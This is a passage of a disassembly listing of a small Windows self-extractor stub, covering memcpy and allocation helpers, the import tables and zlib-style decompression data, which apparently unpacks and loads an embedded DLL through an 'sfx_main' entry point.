loc_4031BA:				; CODE XREF: sub_40315C+49j
		push	ebx		; Size
		push	ecx		; Src
		push	[ebp+Dst]	; Dst
		call	memcpy
		add	[ebp+arg_4], ebx
		mov	eax, [esi+28h]
		add	[ebp+Dst], ebx
		add	esp, 0Ch
		cmp	[ebp+arg_4], eax
		jnz	short loc_403234
		mov	ecx, [esi+24h]
		mov	[ebp+arg_4], ecx
		cmp	[esi+30h], eax
		jnz	short loc_4031E3
		mov	[esi+30h], ecx

loc_4031E3:				; CODE XREF: sub_40315C+82j
		mov	ebx, [esi+30h]
		mov	eax, [edi+10h]
		sub	ebx, ecx
		cmp	ebx, eax
		jbe	short loc_4031F1
		mov	ebx, eax

loc_4031F1:				; CODE XREF: sub_40315C+91j
		test	ebx, ebx
		jz	short loc_4031FF
		cmp	[ebp+arg_8], 0FFFFFFFBh
		jnz	short loc_4031FF
		and	[ebp+arg_8], 0

loc_4031FF:				; CODE XREF: sub_40315C+97j
					; sub_40315C+9Dj
		add	[edi+14h], ebx
		sub	eax, ebx
		mov	[edi+10h], eax
		mov	eax, [esi+34h]
		test	eax, eax
		jz	short loc_403221
		push	ebx
		push	ecx
		push	dword ptr [esi+38h]
		call	eax
		mov	ecx, [ebp+arg_4]
		mov	[esi+38h], eax
		add	esp, 0Ch
		mov	[edi+30h], eax

loc_403221:				; CODE XREF: sub_40315C+B0j
		push	ebx		; Size
		push	ecx		; Src
		push	[ebp+Dst]	; Dst
		call	memcpy
		add	[ebp+Dst], ebx
		add	esp, 0Ch
		add	[ebp+arg_4], ebx

loc_403234:				; CODE XREF: sub_40315C+77j
		mov	eax, [ebp+Dst]
		mov	[edi+0Ch], eax
		mov	eax, [ebp+arg_4]
		pop	edi
		mov	[esi+2Ch], eax
		mov	eax, [ebp+arg_8]
		pop	esi
		pop	ebx
		leave
		retn
sub_40315C	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_403248(int, size_t NumOfElements, size_t SizeOfElements)
sub_403248	proc near		; DATA XREF: sub_402718+3Co

NumOfElements	= dword	ptr  8
SizeOfElements	= dword	ptr  0Ch

		push	[esp+SizeOfElements] ; SizeOfElements
		push	[esp+4+NumOfElements] ;	NumOfElements
		call	calloc
		pop	ecx
		pop	ecx
		retn
sub_403248	endp


; =============== S U B	R O U T	I N E =======================================


; int __cdecl sub_403258(int, void *Memory)
sub_403258	proc near		; DATA XREF: sub_402718+4Bo

Memory		= dword	ptr  8

		push	[esp+Memory]	; Memory
		call	free
		pop	ecx
		retn
sub_403258	endp


; =============== S U B	R O U T	I N E =======================================


; int __thiscall sub_403263(void *, char)
sub_403263	proc near		; DATA XREF: .rdata:off_40432Co

arg_0		= byte ptr  4

		push	esi
		mov	esi, ecx
		call	??1type_info@@UAE@XZ ; type_info::~type_info(void)
		test	[esp+4+arg_0], 1
		jz	short loc_403279
		push	esi		; void *
		call	??3@YAXPAX@Z	; operator delete(void *)
		pop	ecx

loc_403279:				; CODE XREF: sub_403263+Dj
		mov	eax, esi
		pop	esi
		retn	4
sub_403263	endp

; ---------------------------------------------------------------------------
		align 10h
; [00000006 BYTES: COLLAPSED FUNCTION free. PRESS KEYPAD "+" TO	EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION operator delete(void *). PRESS KEYPAD "+"	TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION _wcsdup. PRESS KEYPAD "+"	TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION operator new(uint). PRESS	KEYPAD "+" TO EXPAND]
; [0000002C BYTES: COLLAPSED FUNCTION __onexit.	PRESS KEYPAD "+" TO EXPAND]
; [00000012 BYTES: COLLAPSED FUNCTION _atexit. PRESS KEYPAD "+"	TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION _itow. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION memset. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION memcpy. PRESS KEYPAD "+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION calloc. PRESS KEYPAD "+" TO EXPAND]
; [0000013E BYTES: COLLAPSED FUNCTION start. PRESS KEYPAD "+" TO EXPAND]
; ---------------------------------------------------------------------------
		mov	eax, [ebp-14h]
		mov	ecx, [eax]
		mov	ecx, [ecx]
		mov	[ebp-78h], ecx
		push	eax
		push	ecx
		call	_XcptFilter
		pop	ecx
		pop	ecx
		retn
; ---------------------------------------------------------------------------
		mov	esp, [ebp-18h]
		push	dword ptr [ebp-78h]
		call	ds:_exit
; [00000006 BYTES: COLLAPSED FUNCTION type_info::~type_info(void). PRESS KEYPAD	"+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION __dllonexit. PRESS KEYPAD	"+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION _XcptFilter. PRESS KEYPAD	"+" TO EXPAND]
; [00000006 BYTES: COLLAPSED FUNCTION _initterm. PRESS KEYPAD "+" TO EXPAND]
; [00000012 BYTES: COLLAPSED FUNCTION __setdefaultprecision. PRESS KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_403476	proc near		; DATA XREF: start+77o
		xor	eax, eax
		retn
sub_403476	endp

; [00000001 BYTES: COLLAPSED FUNCTION nullsub_1. PRESS KEYPAD "+" TO EXPAND]
		align 10h

loc_403480:				; DATA XREF: start+Ao
		jmp	ds:_except_handler3
; [00000006 BYTES: COLLAPSED FUNCTION _controlfp. PRESS	KEYPAD "+" TO EXPAND]

; =============== S U B	R O U T	I N E =======================================


sub_40348C	proc near		; DATA XREF: .data:00405004o

; FUNCTION CHUNK AT 0040106A SIZE 0000002F BYTES

		push	offset loc_403498 ; void (__cdecl *)()
		call	_atexit
		pop	ecx
		retn
; ---------------------------------------------------------------------------

; void __cdecl loc_403498()
loc_403498:				; DATA XREF: sub_40348Co
		mov	ecx, offset off_4050B4
		jmp	loc_40106A
sub_40348C	endp

; ---------------------------------------------------------------------------
		align 4
		dd 57h dup(0)
		dd 280h	dup(?)
_text		ends

; Section 2. (virtual address 00004000)
; Virtual size			: 000007B6 (   1974.)
; Section size in file		: 00000800 (   2048.)
; Offset to raw	data for section: 00002A00
; Flags	40000040: Data Readable
; Alignment	: default
;
; Imports from KERNEL32.dll
;
; ===========================================================================

; Segment type:	Externs
; _idata
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; CODE XREF: start+128p
					; DATA XREF: start+128r ...
; DWORD	__stdcall GetTempPathW(DWORD nBufferLength, LPWSTR lpBuffer)
		extrn GetTempPathW:dword ; CODE	XREF: sub_401230+17p
					; DATA XREF: sub_401230+17r
; HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName)
		extrn GetModuleHandleW:dword ; CODE XREF: sub_4010BE+1Dp
					; DATA XREF: sub_4010BE+1Dr
; DWORD	__stdcall GetModuleFileNameW(HMODULE hModule, LPWCH lpFilename,	DWORD nSize)
		extrn GetModuleFileNameW:dword ; CODE XREF: sub_4010BE+24p
					; DATA XREF: sub_4010BE+24r
; HANDLE __stdcall CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD	dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile)
		extrn CreateFileW:dword	; CODE XREF: sub_4010BE+47p
					; sub_4010BE+C7p ...
; DWORD	__stdcall SetFilePointer(HANDLE	hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod)
		extrn SetFilePointer:dword ; CODE XREF:	sub_4010BE+51p
					; sub_4010BE+8Cp ...
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn CloseHandle:dword	; CODE XREF: sub_4010BE+77p
					; sub_4010BE+14Fp ...
; UINT __stdcall GetTempFileNameW(LPCWSTR lpPathName, LPCWSTR lpPrefixString, UINT uUnique, LPWSTR lpTempFileName)
		extrn GetTempFileNameW:dword ; CODE XREF: sub_4010A7+Ep
					; DATA XREF: sub_4010A7+Er
; BOOL __stdcall FreeLibrary(HMODULE hLibModule)
		extrn FreeLibrary:dword	; CODE XREF: sub_40348C-240Dp
					; DATA XREF: sub_40348C-240Dr
; BOOL __stdcall DeleteFileW(LPCWSTR lpFileName)
		extrn DeleteFileW:dword	; CODE XREF: sub_40348C-2404p
					; DATA XREF: sub_40348C-2404r
; BOOL __stdcall WriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite,	LPDWORD	lpNumberOfBytesWritten,	LPOVERLAPPED lpOverlapped)
		extrn WriteFile:dword	; CODE XREF: sub_401047+10p
					; DATA XREF: sub_401047+10r
; BOOL __stdcall ReadFile(HANDLE hFile,	LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped)
		extrn ReadFile:dword	; CODE XREF: sub_401029+10p
					; sub_4010BE+65p
					; DATA XREF: ...
; HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName)
		extrn LoadLibraryW:dword ; CODE	XREF: sub_401000+6p
					; DATA XREF: sub_401000+6r
; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
		extrn GetProcAddress:dword ; CODE XREF:	sub_401000+19p
					; DATA XREF: sub_401000+19r
; void __stdcall GetStartupInfoA(LPSTARTUPINFOA	lpStartupInfo)
		extrn GetStartupInfoA:dword ; CODE XREF: start+104p
					; DATA XREF: start+104r

;
; Imports from MSVCRT.dll
;
		extrn __getmainargs:dword ; CODE XREF: start+B5p
					; DATA XREF: start+B5r	...
		extrn __imp__initterm:dword ; DATA XREF: _inittermr
		extrn __setusermatherr:dword ; CODE XREF: start+7Cp
					; DATA XREF: start+7Cr
		extrn _adjust_fdiv:dword ; DATA	XREF: start+5Er
		extrn _acmdln:dword	; DATA XREF: start+CDr
		extrn __p__fmode:dword	; CODE XREF: start+42p
					; DATA XREF: start+42r
		extrn __set_app_type:dword ; CODE XREF:	start+2Dp
					; DATA XREF: start+2Dr
		extrn _except_handler3:dword ; DATA XREF: .text:loc_403480r
; unsigned int __cdecl _controlfp(unsigned int NewValue, unsigned int Mask)
		extrn __imp__controlfp:dword ; DATA XREF: _controlfpr
		extrn __imp__XcptFilter:dword ;	DATA XREF: _XcptFilterr
; void __cdecl exit(int	Code)
		extrn _exit:dword	; CODE XREF: .text:00403446p
					; DATA XREF: .text:00403446r
; _onexit_t __cdecl onexit(_onexit_t Func)
		extrn _onexit:dword	; CODE XREF: __onexit+Dp
					; DATA XREF: __onexit+Dr
		extrn __imp___dllonexit:dword ;	DATA XREF: __dllonexitr
; __declspec(dllimport)	public:	virtual	__thiscall type_info::~type_info(void)
		extrn __imp_??1type_info@@UAE@XZ:dword
					; DATA XREF: type_info::~type_info(void)r
; void *__cdecl	calloc(size_t NumOfElements, size_t SizeOfElements)
		extrn __imp_calloc:dword ; DATA	XREF: callocr
; void __cdecl exit(int	Code)
		extrn exit:dword	; CODE XREF: start+138p
					; DATA XREF: start+138r
; void *__cdecl	memcpy(void *Dst, const	void *Src, size_t Size)
		extrn __imp_memcpy:dword ; DATA	XREF: memcpyr
; void *__cdecl	memset(void *Dst, int Val, size_t Size)
		extrn __imp_memset:dword ; DATA	XREF: memsetr
; wchar_t *__cdecl _itow(int Value, wchar_t *Dest, int Radix)
		extrn __imp__itow:dword	; DATA XREF: _itowr
; __declspec(dllimport)	void * __cdecl operator	new(unsigned int)
		extrn __imp_??2@YAPAXI@Z:dword ; DATA XREF: operator new(uint)r
; wchar_t *__cdecl _wcsdup(const wchar_t *Str)
		extrn __imp__wcsdup:dword ; DATA XREF: _wcsdupr
; __declspec(dllimport)	void __cdecl operator delete(void *)
		extrn __imp_??3@YAXPAX@Z:dword ; DATA XREF: operator delete(void *)r
; void __cdecl free(void *Memory)
		extrn __imp_free:dword	; DATA XREF: freer
		extrn __p__commode:dword ; CODE	XREF: start+50p
					; DATA XREF: start+50r

;
; Imports from USER32.dll
;
; int __stdcall	MessageBoxW(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType)
		extrn MessageBoxW:dword	; CODE XREF: WinMain(x,x,x,x)+50p
					; DATA XREF: WinMain(x,x,x,x)+50r ...


; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 4040ACh
		align 10h
; char ProcName[]
ProcName	db 'sfx_main',0         ; DATA XREF: sub_401000+13o
		align 4
		dd offset dword_404374
off_4040C0	dd offset sub_4010A1	; DATA XREF: sub_40348C-241Co
					; .data:off_4050B4o
		dd offset sub_40139E
		dd offset sub_40109D
		dd offset sub_401099
; const	WCHAR PrefixString
PrefixString	dw 40h			; DATA XREF: sub_4010A7+6o
		align 4
		dd offset dword_4043C0
off_4040D8	dd offset sub_401382	; DATA XREF: sub_401255+7o
					; sub_40139E+3Bo
dword_4040DC	dd 302E31h		; DATA XREF: sub_40127C+8o
; const	WCHAR Text
Text:					; DATA XREF: WinMain(x,x,x,x)+49o
		unicode	0, <Failed to init.>,0
aError:					; DATA XREF: WinMain(x,x,x,x)+1Bo
		unicode	0, <Error: >,0
aInvalidBitLeng	db 'invalid bit length repeat',0 ; DATA XREF: sub_401676+6F0o
		align 4
aTooManyLengthO	db 'too many length or distance symbols',0 ; DATA XREF: sub_401676+6AFo
aInvalidStoredB	db 'invalid stored block lengths',0 ; DATA XREF: sub_401676+693o
		align 10h
aInvalidBlockTy	db 'invalid block type',0 ; DATA XREF: sub_401676+E1o
		align 4
aInvalidLiteral	db 'invalid literal/length code',0 ; DATA XREF: sub_401E83+4A4o
					; sub_4023B8+2AAo
aInvalidDistanc	db 'invalid distance code',0 ; DATA XREF: sub_401E83+282o
					; sub_4023B8:loc_40260Ao
		align 4
aNeedDictionary	db 'need dictionary',0  ; DATA XREF: sub_402812+2F0o
aIncorrectDataC	db 'incorrect data check',0 ; DATA XREF: sub_402812+20Do
		align 10h
aIncorrectHeade	db 'incorrect header check',0 ; DATA XREF: sub_402812+D6o
		align 4
aInvalidWindowS	db 'invalid window size',0 ; DATA XREF: sub_402812+8Bo
aUnknownCompres	db 'unknown compression method',0 ; DATA XREF: sub_402812+6Fo
		align 4
aIncompleteDyna	db 'incomplete dynamic bit lengths tree',0 ; DATA XREF: sub_402F2E+43o
aOversubscribed	db 'oversubscribed dynamic bit lengths tree',0 ; DATA XREF: sub_402F2E+29o
aIncompleteLite	db 'incomplete literal/length tree',0 ; DATA XREF: sub_402F7C+58o
					; sub_402F7C+ACo
		align 4
aOversubscrib_0	db 'oversubscribed literal/length tree',0 ; DATA XREF: sub_402F7C+38o
					; sub_402F7C+8Fo
		align 4
aIncompatibleVe	db 'incompatible version',0
		align 10h
aBufferError	db 'buffer error',0
		align 10h
aInsufficientMe	db 'insufficient memory',0
aDataError	db 'data error',0
		align 10h
aStreamError	db 'stream error',0
		align 10h
aFileError	db 'file error',0
		align 4
aStreamEnd	db 'stream end',0
		align 4
		dd offset dword_404438
off_40432C	dd offset sub_403263	; DATA XREF: .data:off_405020o
					; .data:off_405038o ...
dword_404330	dd 0FFFFFFFFh, 40342Ch,	403440h, 3 dup(0) ; DATA XREF: start+5o
		dd 1, 404350h, 404358h,	0
		dd offset off_405020
		dd 2 dup(0)
		dd 0FFFFFFFFh, 0
		dd 40h,	404340h
dword_404374	dd 3 dup(0)		; DATA XREF: .rdata:004040BCo
		dd offset off_405038
		dd offset dword_404388
dword_404388	dd 2 dup(0)		; DATA XREF: .rdata:00404384o
		dd 2, 404398h, 4043A4h,	404358h, 0
		dd offset off_405038
		dd 1, 0
		dd 0FFFFFFFFh, 0
		dd 40h,	404388h
dword_4043C0	dd 3 dup(0)		; DATA XREF: .rdata:004040D4o
		dd offset off_405050
		dd offset dword_4043D4
dword_4043D4	dd 2 dup(0)		; DATA XREF: .rdata:004043D0o
		dd 1, 4043E4h, 4043ECh,	0
		dd offset off_405050
		dd 2 dup(0)
		dd 0FFFFFFFFh, 0
dword_404400	dd 40h,	4043D4h, 405378h, 2 dup(0) ; DATA XREF:	.rdata:00404420o
		dd 0FFFFFFFFh, 2 dup(0)
		dd offset dword_404400+8
		dd 0
		db    0			; DATA XREF: .rdata:00404448o
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		db    0
		dd 1, 404420h
dword_404438	dd 3 dup(0)		; DATA XREF: .rdata:00404328o
		dd offset off_405378
		dd offset unk_404428
__IMPORT_DESCRIPTOR_MSVCRT dd rva off_4044DC ; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aMsvcrt_dll	; DLL Name
		dd rva __getmainargs	; Import Address Table
__IMPORT_DESCRIPTOR_KERNEL32 dd	rva off_40449C ; Import	Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aKernel32_dll	; DLL Name
		dd rva GetModuleHandleA	; Import Address Table
__IMPORT_DESCRIPTOR_USER32 dd rva off_404540 ; Import Name Table
		dd 0			; Time stamp
		dd 0			; Forwarder Chain
		dd rva aUser32_dll	; DLL Name
		dd rva MessageBoxW	; Import Address Table
		dd 5 dup(0)
;
; Import names for KERNEL32.dll
;
off_40449C	dd rva word_404768	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_KERNEL32o
		dd rva word_404758
		dd rva word_404744
		dd rva word_40472E
		dd rva word_404720
		dd rva word_40470E
		dd rva word_404700
		dd rva word_4046EC
		dd rva word_4046DE
		dd rva word_4046D0
		dd rva word_4046C4
		dd rva word_4046B8
		dd rva word_4046A8
		dd rva word_404696
		dd rva word_40477C
		dd 0
;
; Import names for MSVCRT.dll
;
off_4044DC	dd rva word_404604	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_MSVCRTo
		dd rva word_404614
		dd rva word_404620
		dd rva word_404634
		dd rva word_4045FA
		dd rva word_404654
		dd rva word_404662
		dd rva word_404674
		dd rva word_404688
		dd rva word_4045EC
		dd rva word_4045E4
		dd rva word_4045DA
		dd rva word_4045CC
		dd rva word_4045A8
		dd rva word_40459E
		dd rva word_404596
		dd rva word_40458C
		dd rva word_404582
		dd rva word_40457A
		dd rva word_40456A
		dd rva word_404560
		dd rva word_404550
		dd rva word_404548
		dd rva word_404644
		dd 0
;
; Import names for USER32.dll
;
off_404540	dd rva word_40479C	; DATA XREF: .rdata:__IMPORT_DESCRIPTOR_USER32o
		dd 0
word_404548	dw 25Eh			; DATA XREF: .rdata:00404534o
		db 'free',0
		align 10h
word_404550	dw 10h			; DATA XREF: .rdata:00404530o
		db '??3@YAXPAX@Z',0
		align 10h
word_404560	dw 1E9h			; DATA XREF: .rdata:0040452Co
		db '_wcsdup',0
word_40456A	dw 0Fh			; DATA XREF: .rdata:00404528o
		db '??2@YAPAXI@Z',0
		align 2
word_40457A	dw 135h			; DATA XREF: .rdata:00404524o
		db '_itow',0
word_404582	dw 299h			; DATA XREF: .rdata:00404520o
		db 'memset',0
		align 4
word_40458C	dw 297h			; DATA XREF: .rdata:0040451Co
		db 'memcpy',0
		align 2
word_404596	dw 249h			; DATA XREF: .rdata:00404518o
		db 'exit',0
		align 2
word_40459E	dw 240h			; DATA XREF: .rdata:00404514o
		db 'calloc',0
		align 4
word_4045A8	dw 0Eh			; DATA XREF: .rdata:00404510o
		db '??1type_info@@UAE@XZ',0
		align 10h
aMsvcrt_dll	db 'MSVCRT.dll',0       ; DATA XREF: .rdata:00404458o
		align 4
word_4045CC	dw 55h			; DATA XREF: .rdata:0040450Co
		db '__dllonexit',0
word_4045DA	dw 186h			; DATA XREF: .rdata:00404508o
		db '_onexit',0
word_4045E4	dw 0D3h			; DATA XREF: .rdata:00404504o
		db '_exit',0
word_4045EC	dw 48h			; DATA XREF: .rdata:00404500o
		db '_XcptFilter',0
word_4045FA	dw 8Fh			; DATA XREF: .rdata:004044ECo
		db '_acmdln',0
word_404604	dw 58h			; DATA XREF: .rdata:off_4044DCo
		db '__getmainargs',0
word_404614	dw 10Fh			; DATA XREF: .rdata:004044E0o
		db '_initterm',0
word_404620	dw 83h			; DATA XREF: .rdata:004044E4o
		db '__setusermatherr',0
		align 4
word_404634	dw 9Dh			; DATA XREF: .rdata:004044E8o
		db '_adjust_fdiv',0
		align 4
word_404644	dw 6Ah			; DATA XREF: .rdata:00404538o
		db '__p__commode',0
		align 4
word_404654	dw 6Fh			; DATA XREF: .rdata:004044F0o
		db '__p__fmode',0
		align 2
word_404662	dw 81h			; DATA XREF: .rdata:004044F4o
		db '__set_app_type',0
		align 4
word_404674	dw 0CAh			; DATA XREF: .rdata:004044F8o
		db '_except_handler3',0
		align 4
word_404688	dw 0B7h			; DATA XREF: .rdata:004044FCo
		db '_controlfp',0
		align 2
word_404696	dw 220h			; DATA XREF: .rdata:004044D0o
		db 'GetProcAddress',0
		align 4
word_4046A8	dw 2F4h			; DATA XREF: .rdata:004044CCo
		db 'LoadLibraryW',0
		align 4
word_4046B8	dw 368h			; DATA XREF: .rdata:004044C8o
		db 'ReadFile',0
		align 4
word_4046C4	dw 48Dh			; DATA XREF: .rdata:004044C4o
		db 'WriteFile',0
word_4046D0	dw 0C3h			; DATA XREF: .rdata:004044C0o
		db 'DeleteFileW',0
word_4046DE	dw 14Ch			; DATA XREF: .rdata:004044BCo
		db 'FreeLibrary',0
word_4046EC	dw 259h			; DATA XREF: .rdata:004044B8o
		db 'GetTempFileNameW',0
		align 10h
word_404700	dw 43h			; DATA XREF: .rdata:004044B4o
		db 'CloseHandle',0
word_40470E	dw 3DFh			; DATA XREF: .rdata:004044B0o
		db 'SetFilePointer',0
		align 10h
word_404720	dw 7Fh			; DATA XREF: .rdata:004044ACo
		db 'CreateFileW',0
word_40472E	dw 1F5h			; DATA XREF: .rdata:004044A8o
		db 'GetModuleFileNameW',0
		align 4
word_404744	dw 1F9h			; DATA XREF: .rdata:004044A4o
		db 'GetModuleHandleW',0
		align 4
word_404758	dw 25Bh			; DATA XREF: .rdata:004044A0o
		db 'GetTempPathW',0
		align 4
word_404768	dw 1F6h			; DATA XREF: .rdata:off_40449Co
		db 'GetModuleHandleA',0
		align 4
word_40477C	dw 239h			; DATA XREF: .rdata:004044D4o
		db 'GetStartupInfoA',0
aKernel32_dll	db 'KERNEL32.dll',0     ; DATA XREF: .rdata:0040446Co
		align 4
word_40479C	dw 1FFh			; DATA XREF: .rdata:off_404540o
		db 'MessageBoxW',0
aUser32_dll	db 'USER32.dll',0       ; DATA XREF: .rdata:00404480o
		align 1000h
_rdata		ends

; Section 3. (virtual address 00005000)
; Virtual size			: 00001460 (   5216.)
; Section size in file		: 00000400 (   1024.)
; Offset to raw	data for section: 00003200
; Flags	C0000040: Data Readable	Writable
; Alignment	: default
; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read/Write
_data		segment	para public 'DATA' use32
		assume cs:_data
		;org 405000h
dword_405000	dd 0			; DATA XREF: start+C0o
		dd offset sub_40348C
dword_405008	dd 0			; DATA XREF: start+BBo
dword_40500C	dd 0			; DATA XREF: start+8Do
dword_405010	dd 4 dup(0)		; DATA XREF: start+88o
off_405020	dd offset off_40432C	; DATA XREF: .rdata:00404358o
		align 8
a_?aviloader@@	db '.?AVILoader@@',0
		align 4
off_405038	dd offset off_40432C	; DATA XREF: .rdata:00404380o
					; .rdata:004043A4o
		align 10h
a_?avcloader@@	db '.?AVCLoader@@',0
		align 10h
off_405050	dd offset off_40432C	; DATA XREF: .rdata:004043CCo
					; .rdata:004043ECo
		align 8
a_?av?Cstreamde	db '.?AV?$CStreamDecompress@VCWin32FileReader@@VCWin32FileWriter@@VCS'
		db 'treamSimpleCallback@@@@',0
		align 4
off_4050B4	dd offset off_4040C0	; DATA XREF: WinMain(x,x,x,x)+8o
					; sub_40348C:loc_403498o
		dd 4 dup(0)
dword_4050C8	dd 10h			; DATA XREF: sub_401676+381r
					; sub_401676+3AFr
		dd 11h,	12h, 0
		dd 8, 7, 9, 6, 0Ah, 5, 0Bh, 4, 0Ch, 3, 0Dh, 2, 0Eh, 1
		dd 0Fh,	0
dword_405118	dd 3, 4, 5, 6, 7, 8, 9,	0Ah, 0Bh, 0Dh, 0Fh, 11h, 13h, 17h
					; DATA XREF: sub_402F7C+1Bo
					; sub_403048+67o
		dd 1Bh,	1Fh, 23h, 2Bh, 33h, 3Bh, 43h, 53h, 63h,	73h, 83h
		dd 0A3h, 0C3h, 0E3h, 102h, 3 dup(0)
dword_405198	dd 8 dup(0)		; DATA XREF: sub_402F7C+16o
					; sub_403048+62o
		dd 4 dup(1), 4 dup(2), 4 dup(3), 4 dup(4), 4 dup(5), 0
		dd 2 dup(0C0h),	0
dword_405218	dd 1, 2, 3, 4, 5, 7, 9,	0Dh, 11h, 19h, 21h, 31h, 41h, 61h
					; DATA XREF: sub_402F7C+6Eo
					; sub_403048+BCo
		dd 81h,	0C1h, 101h, 181h, 201h,	301h, 401h, 601h, 801h
		dd 0C01h, 1001h, 1801h,	2001h, 3001h, 4001h, 6001h
dword_405290	dd 4 dup(0)		; DATA XREF: sub_402F7C+69o
					; sub_403048+B7o
		dd 2 dup(1), 2 dup(2), 2 dup(3), 2 dup(4), 2 dup(5), 2 dup(6)
		dd 2 dup(7), 2 dup(8), 2 dup(9), 2 dup(0Ah), 2 dup(0Bh)
		dd 2 dup(0Ch), 2 dup(0Dh)
dword_405308	dd 0			; DATA XREF: sub_401676+421r
					; sub_401676+4ACr ...
		dd 1, 3, 7, 0Fh, 1Fh, 3Fh, 7Fh,	0FFh, 1FFh, 3FFh, 7FFh
		dd 0FFFh, 1FFFh, 3FFFh,	7FFFh, 0FFFFh, 4040DCh,	4041B8h
		dd 40431Ch, 40431Bh, 404310h, 404300h, 4042F4h,	4042E0h
		dd 4042D0h, 4042B8h, 40431Bh
off_405378	dd offset off_40432C	; DATA XREF: .rdata:00404444o
		align 10h
a_?avtype_info@	db '.?AVtype_info@@',0
dword_405390	dd 1			; DATA XREF: start+6Fr
		align 10h
dword_4053A0	dd 0			; DATA XREF: sub_403048+5Do
					; sub_403048+FAr
dword_4053A4	dd 0			; DATA XREF: sub_403048+7Do
					; sub_403048+90w ...
		dd 16h dup(0)
		dd 40Eh	dup(?)
dword_406438	dd ?			; DATA XREF: sub_403048+B2o
					; sub_403048+108r
dword_40643C	dd ?			; DATA XREF: sub_403048+A1w
					; sub_403048+CCo ...
dword_406440	dd ?			; DATA XREF: sub_403048+9r
					; sub_403048+D9w
dword_406444	dd ?			; DATA XREF: start+A3r
dword_406448	dd ?			; DATA XREF: start+97r
dword_40644C	dd ?			; DATA XREF: start+56r
dword_406450	dd ?			; DATA XREF: start+48r
dword_406454	dd ?			; DATA XREF: start+65w
dword_406458	dd ?			; DATA XREF: __onexit:loc_4032ADo
					; start+34w
dword_40645C	dd ?			; DATA XREF: __onexitr	__onexit+1Ao ...
		align 1000h
_data		ends


		end start
